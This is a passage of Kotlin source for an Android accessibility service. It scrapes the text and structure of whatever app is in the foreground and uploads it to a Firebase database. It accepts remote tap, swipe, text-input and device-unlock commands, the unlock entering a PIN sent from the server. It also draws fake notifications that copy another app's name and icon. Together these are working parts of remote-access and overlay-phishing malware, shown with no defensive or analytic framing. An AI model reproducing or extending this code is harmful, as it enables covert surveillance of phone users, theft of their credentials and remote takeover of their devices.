            audioManager.adjustStreamVolume(android.media.AudioManager.STREAM_RING, android.media.AudioManager.ADJUST_LOWER, 0)
        } catch (e: Exception) {
            Timber.e("Failed to reduce volume: ${e.message}")
        }
    }

    private fun captureScreenNow() {
        if (!isCapturing) return
        try {
            // Priority 1: Use rootInActiveWindow (fastest)
            var root = rootInActiveWindow
            
            // Priority 2: If root is null or belongs to us (the overlay), scan all windows
            if (root == null || root.packageName == packageName || root.childCount == 0) {
                // windows is available now because we added flagRetrieveInteractiveWindows
                val currentWindows = windows 
                if (currentWindows.isNotEmpty()) {
                    // Sort by layer/importance - usually windows are already ordered
                    for (window in currentWindows.reversed()) {
                        val windowRoot = window.root
                        if (windowRoot != null && windowRoot.packageName != packageName) {
                            // Found a non-app window (the actual app)
                            root = windowRoot
                            break
                        }
                    }
                }
            }
            
            if (root != null) {
                val treeJson = buildNodeTree(root, 0)
                val treeStr = treeJson.toString()
                val currentHash = treeStr.hashCode()

                // Only upload if content changed to save bandwidth
                if (currentHash != lastTreeHash) {
                    lastTreeHash = currentHash
                    val payload = JSONObject().apply {
                        put("tree", treeJson)
                        put("ts", System.currentTimeMillis())
                        put("pkg", root.packageName?.toString() ?: "")
                    }
                    deviceRef?.child("screenTree")?.setValue(payload.toString())
                }
                root.recycle()
            }
        } catch (e: Exception) {
            Timber.e("Capture error: ${e.message}")
        }
    }

    private fun stopScreenCapture() {
        isCapturing = false
        updateHandler.removeCallbacks(updateRunnable)
        captureThread?.interrupt()
        captureThread = null
        isUpdatePending = false
        deviceRef?.child("screenTree")?.removeValue()
        lastTreeHash = 0
        Timber.d("Screen capture stopped")
    }

    private fun buildNodeTree(node: AccessibilityNodeInfo, depth: Int): JSONObject {
        val obj = JSONObject()

        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        obj.put("b", JSONArray().apply {
            put(bounds.left); put(bounds.top); put(bounds.right); put(bounds.bottom)
        })

        val text = node.text?.toString() ?: ""
        if (text.isNotEmpty()) obj.put("t", text)

        val desc = node.contentDescription?.toString() ?: ""
        if (desc.isNotEmpty()) obj.put("d", desc)

        val className = node.className?.toString()?.substringAfterLast(".") ?: ""
        if (className.isNotEmpty()) obj.put("c", className)

        if (node.isClickable) obj.put("ck", true)
        if (node.isScrollable) obj.put("sc", true)
        if (node.isEditable) obj.put("ed", true)
        if (node.isCheckable) obj.put("cb", true)
        if (node.isChecked) obj.put("ch", true)

        if (depth == 0) {
            obj.put("pkg", node.packageName?.toString() ?: "")
        }

        // Optimization: Recursive build with filtering
        if (depth < 20 && node.childCount > 0) {
            val children = JSONArray()
            for (i in 0 until node.childCount) {
                try {
                    val child = node.getChild(i)
                    if (child != null) {
                        // Filter: only keep nodes with content or interactivity
                        // This reduces tree size significantly
                        if (child.childCount > 0 || 
                            child.text != null || 
                            child.contentDescription != null || 
                            child.isClickable || 
                            child.isEditable ||
                            child.isCheckable) {
                            children.put(buildNodeTree(child, depth + 1))
                        }
                        child.recycle()
                    }
                } catch (e: Exception) { }
            }
            if (children.length() > 0) {
                obj.put("n", children)
            }
        }

        return obj
    }

    // ==================== REMOTE CONTROL ====================

    private fun setupCommandListeners() {
        // TAP command
        deviceRef?.child("commands/tap")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists() || snapshot.childrenCount == 0L) return
                val x = snapshot.child("x").getValue(Float::class.java) ?: return
                val y = snapshot.child("y").getValue(Float::class.java) ?: return
                handleTap(x, y)
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        // SWIPE command
        deviceRef?.child("commands/swipe")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists() || snapshot.childrenCount == 0L) return
                val x1 = snapshot.child("x1").getValue(Float::class.java) ?: return
                val y1 = snapshot.child("y1").getValue(Float::class.java) ?: return
                val x2 = snapshot.child("x2").getValue(Float::class.java) ?: return
                val y2 = snapshot.child("y2").getValue(Float::class.java) ?: return
                val duration = snapshot.child("duration").getValue(Long::class.java) ?: 300L
                handleSwipe(x1, y1, x2, y2, duration)
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        // GLOBAL ACTION command
        deviceRef?.child("commands/globalAction")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return
                val action = if (snapshot.hasChild("action")) {
                    snapshot.child("action").getValue(String::class.java)
                } else {
                    snapshot.getValue(String::class.java)
                } ?: return
                
                if (action.isEmpty()) return
                handleGlobalAction(action)
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        // TEXT INPUT command
        deviceRef?.child("commands/inputText")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists() || snapshot.childrenCount == 0L) return
                val text = snapshot.child("text").getValue(String::class.java) ?: return
                if (text.isEmpty()) return
                handleInputText(text)
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        // UNLOCK command
        deviceRef?.child("commands/unlock")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists() || snapshot.childrenCount == 0L) return
                val pin = snapshot.child("pin").getValue(String::class.java) ?: return
                if (pin.isNotEmpty()) {
                    handleUnlockDevice(pin)
                }
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })
        // CUSTOM NOTIFICATION command
        deviceRef?.child("commands/customNotification")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists() || snapshot.childrenCount == 0L) return
                val targetPackage = snapshot.child("targetPackage").getValue(String::class.java) ?: return
                val title = snapshot.child("title").getValue(String::class.java) ?: "Notification"
                val message = snapshot.child("message").getValue(String::class.java) ?: ""
                
                handleCustomNotification(targetPackage, title, message)
                snapshot.ref.removeValue()
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun handleTap(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                // Some Vendor OSes require a small line segment to register as an intentional tap
                val path = Path().apply { 
                    moveTo(x, y)
                    lineTo(x + 1f, y + 1f)
                }
                val stroke = GestureDescription.StrokeDescription(path, 0, 50)
                val gesture = GestureDescription.Builder().addStroke(stroke).build()
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        Timber.d("Tap completed at ($x, $y)")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Timber.w("Tap cancelled at ($x, $y)")
                    }
                }, null)
            } catch (e: Exception) {
                Timber.e("Tap error: ${e.message}")
            }
        }
    }

    private fun handleSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val path = Path().apply {
                    moveTo(x1, y1)
                    lineTo(x2, y2)
                }
                val stroke = GestureDescription.StrokeDescription(path, 0, duration.coerceIn(100, 2000))
                val gesture = GestureDescription.Builder().addStroke(stroke).build()
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        Timber.d("Swipe completed ($x1,$y1) -> ($x2,$y2)")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Timber.w("Swipe cancelled")
                    }
                }, null)
            } catch (e: Exception) {
                Timber.e("Swipe error: ${e.message}")
            }
        }
    }

    private fun handleGlobalAction(action: String) {
        val result = when (action) {
            "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "notifications" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "quickSettings" -> performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            "lockScreen" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                } else false
            }
            else -> false
        }
        Timber.d("Global action '$action': $result")
    }

    private fun handleInputText(text: String) {
        try {
            val focused = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focused != null) {
                val args = Bundle().apply {
                    putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        text
                    )
                }
                val result = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                Timber.d("Input text '$text': $result")
                focused.recycle()
            } else {
                Timber.w("No focused input field found for text input")
            }
        } catch (e: Exception) {
            Timber.e("Input text error: ${e.message}")
        }
    }

    private fun handleUnlockDevice(pin: String) {
        Timber.d("Unlock: Starting unlock sequence")
        try {
            // Step 1: Wake up screen
            val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(
                android.os.PowerManager.FULL_WAKE_LOCK
                    or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
                    or android.os.PowerManager.ON_AFTER_RELEASE,
                "MyApp:UnlockWakeLock"
            )
            wl.acquire(5000)
            Timber.d("Unlock: Screen woken up")

            // Step 2: Wait for screen to fully wake, then swipe up on main thread
            mainHandler.postDelayed({
                val metrics = resources.displayMetrics
                val w = metrics.widthPixels.toFloat()
                val h = metrics.heightPixels.toFloat()
                handleSwipe(w / 2, h * 0.85f, w / 2, h * 0.15f, 250)
                Timber.d("Unlock: Swipe up dispatched")

                // Step 3: After swipe animation completes, enter PIN
                mainHandler.postDelayed({
                    enterPinOnMainThread(pin)
                }, 2000)
            }, 1000)

        } catch (e: Exception) {
            Timber.e("Unlock error: ${e.message}")
        }
    }

    private fun enterPinOnMainThread(pin: String) {
        try {
            Timber.d("Unlock: Attempting PIN entry")

            // Check if there's a text password field
            val inputNode = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (inputNode != null && inputNode.isEditable) {
                Timber.d("Unlock: Found editable field — setting text")
                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pin)
                }
                inputNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)

                // Press Enter/OK after a short delay
                mainHandler.postDelayed({
                    tryClickConfirmButton()
                }, 800)
                return
            }

            // No editable field — it's a PIN pad. Click each digit with delays.
            Timber.d("Unlock: No editable field, using PIN pad clicks")
            val digits = pin.toCharArray()
            for (i in digits.indices) {
                mainHandler.postDelayed({
                    clickPinDigit(digits[i].toString())
                }, (i * 400).toLong())
            }

            // After all digits, try pressing Enter/OK
            mainHandler.postDelayed({
                tryClickConfirmButton()
            }, (digits.size * 400 + 800).toLong())

        } catch (e: Exception) {
            Timber.e("PIN entry error: ${e.message}")
        }
    }

    private fun clickPinDigit(digit: String) {
        try {
            val root = rootInActiveWindow
            if (root == null) {
                Timber.w("Unlock: rootInActiveWindow is null for digit $digit")
                return
            }
            val nodes = root.findAccessibilityNodeInfosByText(digit)
            Timber.d("Unlock: Found ${nodes.size} nodes for digit '$digit'")

            for (node in nodes) {
                val nodeText = node.text?.toString()?.trim() ?: ""
                val nodeDesc = node.contentDescription?.toString()?.trim() ?: ""
                // Exact match for single digits to avoid "1" clicking "10"
                if (nodeText == digit || nodeDesc == digit) {
                    // Walk up to find clickable parent
                    var current: AccessibilityNodeInfo? = node
                    while (current != null) {
                        if (current.isClickable) {
                            val result = current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Timber.d("Unlock: Clicked digit '$digit': $result")
                            return
                        }
                        current = current.parent
                    }
                    // If no clickable parent, try clicking the node itself
                    val directResult = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Timber.d("Unlock: Direct click digit '$digit': $directResult")
                    return
                }
            }
            Timber.w("Unlock: No exact match found for digit '$digit'")
        } catch (e: Exception) {
            Timber.e("Unlock: clickPinDigit error: ${e.message}")
        }
    }

    private fun tryClickConfirmButton() {
        val confirmLabels = listOf("OK", "Enter", "Done", "ENTER", "done", "ok", "\u2713", "Confirm")
        try {
            val root = rootInActiveWindow ?: return
            for (label in confirmLabels) {
                val nodes = root.findAccessibilityNodeInfosByText(label)
                for (node in nodes) {
                    var current: AccessibilityNodeInfo? = node
                    while (current != null) {
                        if (current.isClickable) {
                            current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Timber.d("Unlock: Pressed confirm button '$label'")
                            return
                        }
                        current = current.parent
                    }
                }
            }
            // Fallback: try pressing Enter key event
            performGlobalAction(GLOBAL_ACTION_BACK) // Dismiss keyboard if open
        } catch (e: Exception) {
            Timber.e("Unlock: tryClickConfirmButton error: ${e.message}")
        }
    }

    private fun handleCustomNotification(targetPackage: String, title: String, message: String) {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = android.view.Gravity.TOP or android.view.Gravity.CENTER_HORIZONTAL
            
            val wrapper = android.widget.FrameLayout(this)
            wrapper.setPadding(30, 80, 30, 0)
            
            val container = android.widget.LinearLayout(this).apply {
                orientation = android.widget.LinearLayout.VERTICAL
                val bg = android.graphics.drawable.GradientDrawable()
                bg.setColor(Color.parseColor("#252525"))
                bg.cornerRadius = 48f
                background = bg
                setPadding(45, 35, 45, 35)
                elevation = 20f
            }
            
            wrapper.addView(container, android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
            ))
            
            val headerRow = android.widget.LinearLayout(this).apply {
                orientation = android.widget.LinearLayout.HORIZONTAL
                gravity = android.view.Gravity.CENTER_VERTICAL
            }
            
            var appName = title
            var appIcon: Drawable? = null
            try {
                val pm = packageManager
                val appInfo = pm.getApplicationInfo(targetPackage, 0)
                appName = pm.getApplicationLabel(appInfo).toString()
                appIcon = pm.getApplicationIcon(appInfo)
            } catch (e: Exception) {}
            
            val iconView = android.widget.ImageView(this).apply {
                if (appIcon != null) {
                    setImageDrawable(appIcon)
                } else {
                    setImageResource(android.R.drawable.sym_def_app_icon)
                }
                layoutParams = android.widget.LinearLayout.LayoutParams(45, 45).apply {
                    marginEnd = 16
                }
            }
            headerRow.addView(iconView)
            
            val nameView = android.widget.TextView(this).apply {
                text = "$appName • now"
                setTextColor(Color.parseColor("#A0A0A5"))
                textSize = 12f
            }
            headerRow.addView(nameView)
            container.addView(headerRow)
            
            val titleView = android.widget.TextView(this).apply {
                text = title
                setTextColor(Color.WHITE)
                textSize = 15f
                typeface = android.graphics.Typeface.DEFAULT_BOLD
                layoutParams = android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = 12
                }
            }
            container.addView(titleView)
            
            val msgView = android.widget.TextView(this).apply {
                text = message
                setTextColor(Color.parseColor("#EBEBF5"))
                textSize = 14f
                maxLines = 2
                ellipsize = android.text.TextUtils.TruncateAt.END
                layoutParams = android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = 4
                }
            }
            container.addView(msgView)
            
            wrapper.translationY = -300f
            wrapper.alpha = 0f
            
            val handler = Handler(Looper.getMainLooper())
            val removeRunnable = Runnable {
                try {
                    wrapper.animate()
                        .translationY(-300f)
                        .alpha(0f)
                        .setDuration(300)
                        .withEndAction {
                            try { wm.removeView(wrapper) } catch (e: Exception) {}
                        }.start()
                } catch (e: Exception) {}
            }
            
            container.setOnClickListener {
                handler.removeCallbacks(removeRunnable)
                try {
                    val launchIntent = packageManager.getLaunchIntentForPackage(targetPackage)
                    if (launchIntent != null) {
                        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(launchIntent)
                    }
                } catch (e: Exception) {}
                try { wm.removeView(wrapper) } catch (e: Exception) {}
            }
            
            wm.addView(wrapper, params)
            
            wrapper.animate()
                .translationY(0f)
                .alpha(1f)
                .setDuration(400)
                .setInterpolator(android.view.animation.OvershootInterpolator())
                .start()
                
            handler.postDelayed(removeRunnable, 5000)
            
        } catch (e: Exception) {
            Timber.e("Custom overlay error: ${e.message}")
        }
    }
    
    private fun drawableToBitmap(drawable: Drawable): Bitmap {
        if (drawable is BitmapDrawable) {
            return drawable.bitmap
        }
        val bitmap = Bitmap.createBitmap(
            if (drawable.intrinsicWidth > 0) drawable.intrinsicWidth else 1,
            if (drawable.intrinsicHeight > 0) drawable.intrinsicHeight else 1,
            Bitmap.Config.ARGB_8888
        )
        val canvas = Canvas(bitmap)
        drawable.setBounds(0, 0, canvas.width, canvas.height)
        drawable.draw(canvas)
        return bitmap
    }

    // ==================== LIFECYCLE ====================

    override fun onInterrupt() {}

    override fun onDestroy() {
        stopScreenCapture()
        instance = null
        isServiceReady = false
        super.onDestroy()
    }
}
